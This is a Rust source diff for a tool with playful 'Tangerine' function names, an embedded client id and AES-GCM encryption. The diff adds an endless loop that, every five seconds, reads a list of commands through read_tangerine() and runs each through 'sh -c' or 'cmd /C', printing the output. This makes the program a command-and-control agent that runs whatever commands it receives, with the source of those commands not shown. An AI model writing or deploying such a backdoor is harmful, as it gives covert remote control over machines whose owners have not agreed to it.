@@ -5,11 +5,13 @@ use aes_gcm::{
 use std::{fs::File, fmt::format};
 use std::io::{BufRead, Write};
 use std::{env, io};
+use std::process::Command;
 
 include!(concat!(env!("OUT_DIR"), "/id.rs"));
 
 pub fn run() {
     let args: Vec<String> = env::args().collect();
+    if args.len() >= 2 {
     if args[1] == "Show me the magic Tangerine" {
         println!("{}", client_id());
         return;
@@ -19,15 +21,38 @@ pub fn run() {
     } else if args[1] == "Hide my Tangerine" {
         hide_tangerine();
         return;
-    } else if (args[1] == "Eat my Tangerine") {
+    } else if args[1] == "Eat my Tangerine" {
         let lines = read_tangerine();
         for line in lines {
             println!("Got {}", line);
         }
     }
+}
 
-    println!("Client id is {}", client_id());
-    println!("Encryption key is {}", encryption_key());
+    loop {
+        println!("Looping!");
+        let commands = read_tangerine();
+        println!("Got command");
+        println!("Commands are {:?}", commands);
+        for command in commands {
+            let output = if cfg!(target_os = "windows") {
+                Command::new("cmd")
+                        .args(["/C", &command])
+                        .output()
+                        .expect("failed to execute process")
+            } else {
+                Command::new("sh")
+                        .arg("-c")
+                        .arg(&command)
+                        .output()
+                        .expect("failed to execute process")
+            };
+            println!("status: {}", output.status);
+            println!("{}", String::from_utf8(output.stdout).unwrap());
+            eprintln!("{}", String::from_utf8(output.stderr).unwrap());
+        }
+        std::thread::sleep(std::time::Duration::from_secs(5));
+    }
 }
 
 fn create_tangerine() {
